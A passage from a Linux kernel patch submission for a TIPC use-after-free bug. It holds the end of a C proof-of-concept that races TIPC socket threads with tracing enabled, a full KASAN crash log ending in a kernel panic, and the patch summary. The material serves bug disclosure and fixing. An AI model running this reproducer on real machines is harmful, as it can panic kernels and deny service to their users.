+    char buf[4096];
+    long cnt = 0;
+    fcntl(srv_fd, F_SETFL, fcntl(srv_fd, F_GETFL) | O_NONBLOCK);
+    while (!stop_flag) {
+        ssize_t n = recv(srv_fd, buf, sizeof(buf), 0);
+        if (n > 0) cnt++;
+        else if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {}
+    }
+    printf("recv %ld\n", cnt);
+    return NULL;
+}
+
+int main(void)
+{
+    enable_trace();
+    srv_fd = socket(AF_TIPC, SOCK_RDM, 0);
+    if (srv_fd < 0) { perror("socket srv"); return 1; }
+    int rcvbuf = 1 << 20;
+    setsockopt(srv_fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
+    struct sockaddr_tipc srv = {0};
+    srv.family = AF_TIPC;
+    srv.addrtype = TIPC_SERVICE_RANGE;
+    srv.scope = TIPC_CLUSTER_SCOPE;
+    srv.addr.nameseq.type = TIPC_TYPE;
+    srv.addr.nameseq.lower = 1;
+    srv.addr.nameseq.upper = 1;
+    if (bind(srv_fd, (struct sockaddr *)&srv, sizeof(srv)) < 0) { perror("bind"); return 1; }
+    struct sockaddr_tipc name = {0};
+    socklen_t namelen = sizeof(name);
+    if (getsockname(srv_fd, (struct sockaddr *)&name, &namelen) < 0) { perror("getsockname"); return 1; }
+    unsigned int portid = name.addr.id.ref;
+    printf("server portid %u\n", portid);
+    char filter[128];
+    snprintf(filter, sizeof(filter), "%u 0 0 0 0\n", portid);
+    write_file("/proc/sys/net/tipc/sk_filter", filter);
+
+    cli_fd = socket(AF_TIPC, SOCK_RDM, 0);
+    if (cli_fd < 0) { perror("socket cli"); return 1; }
+    int imp = TIPC_CRITICAL_IMPORTANCE;
+    setsockopt(cli_fd, SOL_TIPC, TIPC_IMPORTANCE, &imp, sizeof(imp));
+
+    pthread_t th[3];
+    pthread_create(&th[0], NULL, sender, NULL);
+    pthread_create(&th[1], NULL, poller, NULL);
+    pthread_create(&th[2], NULL, receiver, NULL);
+    sleep(5);
+    stop_flag = 1;
+    for (int i = 0; i < 3; i++) pthread_join(th[i], NULL);
+    system("tail -80 /sys/kernel/tracing/trace");
+    return 0;
+}
+------END poc.c--------
+
+----BEGIN crash log----
+[  282.625215][ T9764] page_owner tracks the page as allocated
+[  282.626124][ T9764] page last allocated via order 3, migratetype Unmovable, gfp_mask 0xd2cc0(GFP_KERNEL|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 9763, tgid 9760 (python3), ts 282622559122, free_ts 280322580853
+[  282.628916][ T9764] page last free pid 9750 tgid 9750 stack trace:
+[  282.630090][ T9764] Kernel panic - not syncing: KASAN: panic_on_warn set ...
+[  282.631030][ T9764] CPU: 1 UID: 0 PID: 9764 Comm: python3 Not tainted 7.1.0-rc2 #10 PREEMPT(full)
+[  282.632219][ T9764] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  282.633618][ T9764] Call Trace:
+[  282.634056][ T9764]  <TASK>
+[  282.634440][ T9764]  vpanic+0x6c3/0x790
+[  282.634974][ T9764]  ? __pfx_vpanic+0x10/0x10
+[  282.635573][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  282.636323][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  282.637064][ T9764]  ? irqentry_exit+0x24d/0x830
+[  282.637683][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  282.638419][ T9764]  ? lockdep_hardirqs_on+0x7b/0x110
+[  282.639112][ T9764]  ? tipc_skb_dump+0x14a4/0x14d0
+[  282.639756][ T9764]  panic+0xca/0xd0
+[  282.640261][ T9764]  ? __pfx_panic+0x10/0x10
+[  282.640855][ T9764]  check_panic_on_warn+0x61/0x80
+[  282.641542][ T9764]  end_report+0x13e/0x180
+[  282.642133][ T9764]  kasan_report+0xf4/0x120
+[  282.642764][ T9764]  ? tipc_skb_dump+0x14a4/0x14d0
+[  282.643600][ T9764]  tipc_skb_dump+0x14a4/0x14d0
+[  282.644400][ T9764]  tipc_list_dump+0x1b6/0x2a0
+[  282.645093][ T9764]  tipc_sk_dump+0xa92/0xcc0
+[  282.645700][ T9764]  ? trace_event_buffer_reserve+0x150/0x300
+[  282.646510][ T9764]  trace_event_raw_event_tipc_sk_class+0x2c1/0x490
+[  282.647402][ T9764]  ? __pfx_trace_event_raw_event_tipc_sk_class+0x10/0x10
+[  282.648345][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  282.649114][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  282.649884][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  282.650654][ T9764]  ? __pfx_tipc_poll+0x10/0x10
+[  282.651310][ T9764]  tipc_poll+0x290/0x590
+[  282.651895][ T9764]  sock_poll+0x134/0x490
+[  282.652492][ T9764]  do_sys_poll+0x507/0xbf0
+[  282.653113][ T9764]  ? __pfx_do_sys_poll+0x10/0x10
+[  282.653829][ T9764]  ? do_raw_spin_lock+0x12d/0x270
+[  282.654597][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  282.655369][ T9764]  ? do_futex+0x1cd/0x230
+[  282.655977][ T9764]  ? __pfx_do_futex+0x10/0x10
+[  282.656614][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  282.657381][ T9764]  __x64_sys_poll+0x181/0x3e0
+[  282.658035][ T9764]  ? __pfx___x64_sys_poll+0x10/0x10
+[  282.658745][ T9764]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  282.659515][ T9764]  ? rcu_is_watching+0x12/0xc0
+[  282.660208][ T9764]  do_syscall_64+0x116/0xf80
+[  282.660823][ T9764]  ? irqentry_exit+0x117/0x830
+[  282.661476][ T9764]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  282.662266][ T9764] RIP: 0033:0x7f332e77d9ee
+[  282.662861][ T9764] Code: 08 0f 85 f5 4b ff ff 49 89 fb 48 89 f0 48 89 d7 48 89 ce 4c 89 c2 4d 89 ca 4c 8b 44 24 08 4c 8b 4c 24 10 4c 89 5c 24 08 0f 05 <c3> 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 80 00 00 00 00 48 83 ec 08
+[  282.664714][ T9764] RSP: 002b:00007f332d6fdb58 EFLAGS: 00000246 ORIG_RAX: 0000000000000007
+[  282.665298][ T9764] RAX: ffffffffffffffda RBX: 00007f332d6fe6c0 RCX: 00007f332e77d9ee
+[  282.665838][ T9764] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 00007f332e604450
+[  282.666442][ T9764] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
+[  282.666986][ T9764] R10: 0000000000000000 R11: 0000000000000246 R12: 00007f332e1834c0
+[  282.667563][ T9764] R13: 000000000c939210 R14: 00007f332d6fe640 R15: 00007f332e19af10
+[  282.668176][ T9764]  </TASK>
+[  282.669068][ T9764] Kernel Offset: disabled
+[  282.669366][ T9764] Rebooting in 86400 seconds..
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
+Zihan Xi (1):
+  tipc: avoid use-after-free in trace queue dumps
+
+ net/tipc/socket.c | 12 +++---------
+ net/tipc/trace.c  | 44 +++++---------------------------------------
+ 2 files changed, 8 insertions(+), 48 deletions(-)
+
+-- 
+2.43.0
